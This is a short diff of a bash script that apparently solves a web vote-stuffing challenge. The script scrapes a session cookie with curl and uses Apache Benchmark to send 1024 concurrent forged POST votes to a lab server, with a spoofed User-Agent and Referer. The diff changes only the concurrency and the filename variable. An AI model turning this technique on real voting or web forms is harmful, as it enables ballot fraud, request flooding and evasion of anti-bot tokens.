@@ -13,7 +13,7 @@ URL=http://173.246.108.142/level2.php		# URL
 TYPE='application/x-www-form-urlencoded'	# Content Type.
 REQ=$((1 << 10))				# Total number of requests.
 FILE=body-content				# Name of the file with the encode string to be submitted.
-CONC=50						# Number of concurrent requests.
+CONC=25						# Number of concurrent requests.
 VERB=1						# Verbosity level(from 0 to 4)
 HEADER='User-Agent: Windows NT 100000.0.0.0.1 havk64 - Using Apache Benchmark utility'
 REF="Referer: $URL"
@@ -22,7 +22,7 @@ REF="Referer: $URL"
 COOKIE=$(curl -X HEAD -s -c - http://173.246.108.142/level1.php | grep HoldTheDoor | awk '{ print $7 }')
 
 # Writing the cookie for the file that Apache needs:
-echo -n "id=23&holdthedoor=submit&key=$COOKIE" > body-content
+echo -n "id=23&holdthedoor=submit&key=$COOKIE" > $FILE
 
 # Using Apache Benchmark to do the post requests:
 ab -n $REQ -c $CONC -T $TYPE -H "$HEADER" -H "$REF" -p $FILE -C "HoldTheDoor=$COOKIE" -v $VERB $URL
